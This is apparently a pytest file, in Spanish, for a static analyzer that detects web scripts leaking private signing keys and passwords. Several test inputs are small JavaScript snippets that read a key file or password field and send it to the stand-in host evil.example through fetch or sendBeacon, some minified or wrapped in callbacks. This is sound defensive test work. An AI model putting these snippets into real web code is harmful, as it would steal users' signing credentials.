"""Pruebas del analizador estatico (Nivel 2).

El analizador responde "que podria hacer este codigo". Dos propiedades
importan mas que ninguna otra:

* que encuentre la ruta cuando existe, aunque atraviese funciones, envoltorios
  y codificaciones;
* que **no** la invente cuando no existe — y en particular que enviar la firma,
  algo que toda aplicacion correcta hace, jamas se reporte como fuga.
"""

from __future__ import annotations

import pytest

from firmascope.audit_core.conclusions import Confidence
from firmascope.audit_core.events import Tag
from firmascope.static_analyzer import analyze_scripts, analyze_source, detect_signals
from firmascope.static_analyzer import parser


def paths_for(code: str, label: str = "app.js"):
    return analyze_source(code.encode("utf-8"), label, f"https://sitio.example/{label}")


def private_paths(code: str):
    return [p for p in paths_for(code) if p.private]


# ----------------------------------------------------------------------
# El entorno
# ----------------------------------------------------------------------

def test_ast_disponible():
    """Sin AST el analisis cae a patrones y pierde casi todo su valor."""
    assert parser.available(), "tree-sitter-javascript no esta disponible"


# ----------------------------------------------------------------------
# Deteccion de rutas
# ----------------------------------------------------------------------

def test_ruta_directa_de_fichero_a_red():
    paths = private_paths("""
        async function enviar() {
          const keyBytes = await document.getElementById('key-file').files[0].arrayBuffer();
          await fetch('https://evil.example/c', { method: 'POST', body: keyBytes });
        }
    """)
    assert len(paths) == 1
    assert paths[0].channel == "network"
    assert Tag.KEY_FILE.value in paths[0].labels


def test_ruta_atraviesa_funciones_locales():
    """La propagacion interprocedural es lo que distingue esto de un grep."""
    paths = private_paths("""
        function leer(file) {
          const reader = new FileReader();
          reader.readAsArrayBuffer(file);
          return reader.result;
        }
        function empaquetar(bytes) { return btoa(bytes); }
        async function onSign() {
          const f = document.getElementById('key-file').files[0];
          const datos = empaquetar(leer(f));
          navigator.sendBeacon('https://evil.example/c', datos);
        }
    """)
    assert paths, "no se siguio la ruta a traves de leer() y empaquetar()"
    assert paths[0].channel == "network"


def test_ruta_a_traves_de_formdata():
    """`form.append(...)` + `fetch(url, {body: form})`: subir un fichero."""
    paths = private_paths("""
        async function subir(keyBytes, password) {
          const form = new FormData();
          form.append('key', new Blob([keyBytes]), 'fiel.key');
          form.append('password', password);
          await fetch('/api/sign', { method: 'POST', body: form });
        }
    """)
    assert paths, "el acumulador FormData no propago la procedencia"
    assert not paths[0].derived, "envolver en Blob/FormData no oscurece el dato"


def test_ruta_a_almacenamiento_local():
    paths = private_paths("""
        async function guardar(keyBytes) {
          localStorage.setItem('fiel', btoa(keyBytes));
        }
    """)
    assert paths
    assert paths[0].channel == "storage"


def test_parametro_se_siembra_por_nombre_con_confianza_baja():
    """El invocador de un callback suele ser inalcanzable para el analisis."""
    paths = private_paths("""
        async function enviarMaterial(keyBytes, password) {
          await fetch('https://evil.example/c', {
            method: 'POST',
            body: JSON.stringify({ k: keyBytes, p: password })
          });
        }
    """)
    assert paths
    assert paths[0].confidence is Confidence.LOW, (
        "una heuristica de nombre no puede reportarse con confianza alta")
    assert paths[0].source.kind == "name"


# ----------------------------------------------------------------------
# Directo frente a derivado
# ----------------------------------------------------------------------

def test_base64_no_convierte_la_salida_en_derivada():
    """Un .key en base64 sigue siendo el .key: la transmision es directa."""
    paths = private_paths("""
        async function enviar(keyBytes) {
          await fetch('https://evil.example/c', { method: 'POST', body: btoa(keyBytes) });
        }
    """)
    assert paths
    assert not paths[0].derived


def test_cifrar_si_convierte_la_salida_en_derivada():
    """Lo que sale es opaco, pero su procedencia esta establecida."""
    paths = private_paths("""
        async function enviar(pkcs8, transportKey) {
          const sellado = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv: iv }, transportKey, pkcs8);
          await fetch('https://evil.example/c', { method: 'POST', body: sellado });
        }
    """)
    assert paths
    assert paths[0].derived


# ----------------------------------------------------------------------
# Ausencia de falsos positivos
# ----------------------------------------------------------------------

def test_enviar_la_firma_no_es_una_fuga():
    """El nucleo etico del modelo de procedencia.

    S3 + S5 --sign--> S6. Si la firma arrastrase la procedencia privada, todo
    sitio correcto quedaria marcado como exfiltrador.
    """
    paths = private_paths("""
        async function firmar(privateKey, documento) {
          const firma = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', privateKey, documento);
          await fetch('/api/recibo', { method: 'POST', body: firma });
        }
    """)
    assert paths == [], "enviar la firma se reporto como fuga de material privado"


def test_enviar_el_certificado_no_es_una_fuga():
    """El .cer es material publico."""
    paths = private_paths("""
        async function enviar(cerBytes) {
          await fetch('/api/cert', { method: 'POST', body: btoa(cerBytes) });
        }
    """)
    assert paths == []


def test_api_key_no_se_confunde_con_la_clave_privada():
    paths = private_paths("""
        async function llamar(apiKey) {
          await fetch('/api/x', { headers: { Authorization: apiKey } });
        }
    """)
    assert paths == []


def test_firma_local_sin_salida_no_produce_rutas():
    paths = private_paths("""
        async function firmar(keyBytes, password) {
          const pkcs8 = await descifrar(keyBytes, password);
          const key = await crypto.subtle.importKey('pkcs8', pkcs8, alg, false, ['sign']);
          return crypto.subtle.sign('RSASSA-PKCS1-v1_5', key, documento);
        }
    """)
    assert paths == []


# ----------------------------------------------------------------------
# Robustez
# ----------------------------------------------------------------------

def test_codigo_invalido_no_rompe_el_analisis():
    """Un fallo de analisis nunca debe tumbar una auditoria."""
    assert analyze_source(b"function( { const ;;; <<<>>>", "roto.js") is not None


def test_script_vacio():
    assert analyze_source(b"", "vacio.js") == []


def test_señales_por_script():
    signals = detect_signals("""
        crypto.subtle.importKey('raw', x);
        localStorage.setItem('a', 'b');
        fetch('/x');
        new Worker('w.js');
        eval('1');
    """)
    assert signals.webcrypto and signals.storage and signals.network
    assert signals.workers and signals.dynamic_eval


def test_analyze_scripts_agrega_el_inventario():
    scripts = [
        {"url": "https://sitio.example/app.js", "sha256": "a" * 64, "third_party": False},
        {"url": "https://cdn.tercero.example/t.js", "sha256": "b" * 64, "third_party": True},
    ]
    bodies = {
        "a" * 64: b"async function f(keyBytes){ await fetch('/x', {body: keyBytes}); }",
        "b" * 64: b"console.log('analytics');",
    }
    report = analyze_scripts(scripts, lambda s: bodies[s["sha256"]])

    assert report.parsed == 2
    assert report.failed == 0
    assert len(report.third_party_scripts()) == 1
    assert report.private_paths()
    assert report.paths_to_channel("network")
    assert report.to_dict()["scripts_parsed"] == 2


def test_analyze_scripts_tolera_cuerpos_ausentes():
    scripts = [{"url": "https://sitio.example/a.js", "sha256": "c" * 64}]
    report = analyze_scripts(scripts, lambda s: None)
    assert report.skipped == 1
    assert report.paths == []


# ----------------------------------------------------------------------
# Las aplicaciones de laboratorio como comportamiento de referencia
# ----------------------------------------------------------------------

@pytest.mark.parametrize("demo,espera_ruta_privada,espera_derivada", [
    ("demo-safe", False, None),
    ("demo-key-exfiltration", True, False),
    ("demo-encrypted-exfiltration", True, True),
    ("demo-server-sign", True, False),
    ("demo-static-only", True, False),
])
def test_laboratorio(lab_sources, demo, espera_ruta_privada, espera_derivada):
    paths = [p for p in analyze_source(lab_sources[demo], "app.js",
                                       f"http://lab.test/{demo}/app.js") if p.private]
    if not espera_ruta_privada:
        assert paths == [], f"{demo} no debe producir rutas privadas"
        return
    assert paths, f"{demo}: no se detecto la ruta de exfiltracion"
    assert paths[0].channel == "network"
    assert paths[0].derived is espera_derivada


# ----------------------------------------------------------------------
# Lo que destapo el codigo empaquetado y minificado
# ----------------------------------------------------------------------

def api_private_paths(code: str):
    """Rutas privadas cuyo origen es una API, no una heuristica de nombre."""
    return [p for p in private_paths(code) if p.source.kind == "api"]


def test_callback_capturado_por_clausura():
    """`labMain(handler)` invoca `handler` desde un manejador anidado."""
    paths = api_private_paths("""
        function labMain(handler) {
          document.getElementById('sign').addEventListener('click', async function () {
            const f = document.getElementById('key-file').files[0];
            await handler(f);
          });
        }
        labMain(async function (x) {
          await fetch('https://evil.example/c', { method: 'POST', body: x });
        });
    """)
    assert paths, "la procedencia no cruzo el callback"
    assert paths[0].source.name == "input.files"


def test_callback_a_una_funcion_invocada_en_el_acto():
    """Lo que genera un bundler al inlinar: `!function (cb) {...}(handler)`."""
    paths = api_private_paths("""
        !function (cb) {
          const f = document.getElementById('key-file').files[0];
          cb(f);
        }(function (x) { fetch('https://evil.example/c', { method: 'POST', body: x }); });
    """)
    assert paths


def test_los_retornos_distinguen_el_punto_de_llamada():
    """`leer(.key)` y `leer(.cer)` comparten funcion, no procedencia.

    Sin esta distincion el certificado — que viaja con la firma — arrastraba
    la procedencia del .key: un falso positivo sobre el envio legitimo.
    """
    paths = private_paths("""
        function leer(file) { return file.arrayBuffer(); }
        async function onSign() {
          const k = await leer(document.getElementById('key-file').files[0]);
          const c = await leer(document.getElementById('cer-file').files[0]);
          await fetch('/api/recibo', { method: 'POST', body: c });
        }
    """)
    assert paths == [], "el certificado heredo la procedencia del .key"


def test_una_funcion_que_firma_no_devuelve_la_clave():
    """El resumen de `firmar(clave, doc)` deja pasar solo lo publico."""
    paths = private_paths("""
        async function firmar(privateKey, doc) {
          return crypto.subtle.sign('RSASSA-PKCS1-v1_5', privateKey, doc);
        }
        async function onSign(keyBytes) {
          const key = await crypto.subtle.importKey('pkcs8', keyBytes, alg, false, ['sign']);
          const firma = await firmar(key, 'documento');
          await fetch('/api/recibo', { method: 'POST', body: firma });
        }
    """)
    assert paths == []


def test_nombres_reutilizados_en_bloques_no_se_mezclan():
    """terser reutiliza `t` en un bloque anidado; son variables distintas."""
    paths = private_paths("""
        async function onSign() {
          const t = document.getElementById('key-file');
          try {
            const t = document.getElementById('cer-file').files[0];
            await fetch('/api/cert', { method: 'POST', body: t });
          } catch (e) {}
        }
    """)
    assert paths == [], "el .cer del bloque interior heredo la pista del .key exterior"


def test_el_id_del_campo_etiqueta_lo_que_se_lee():
    """La minificacion borra los nombres, pero no los ids del HTML."""
    paths = api_private_paths("""
        !function () {
          const n = document.getElementById("password").value;
          navigator.sendBeacon("https://evil.example/b", n);
        }();
    """)
    assert paths
    assert Tag.KEY_PASSWORD.value in paths[0].labels


def test_un_elemento_por_si_mismo_no_es_material_sensible():
    """La pista solo cuenta al leer su contenido, no al usar el elemento."""
    paths = private_paths("""
        !function () {
          const el = document.getElementById("password");
          fetch("/api/ui", { method: "POST", body: String(el.offsetWidth) });
        }();
    """)
    assert paths == []


def test_bundle_minificado_del_laboratorio(lab_sources):
    """demo-minified: la ruta real, y la entrega de la firma como publica."""
    paths = analyze_source(lab_sources["demo-minified"], "bundle.min.js")
    privadas = [p for p in paths if p.private]
    assert len(privadas) == 1
    assert privadas[0].source.kind == "api"
    assert privadas[0].channel == "network"
    publicas = [p for p in paths if not p.private]
    assert any(Tag.SIGNATURE.value in p.labels for p in publicas)
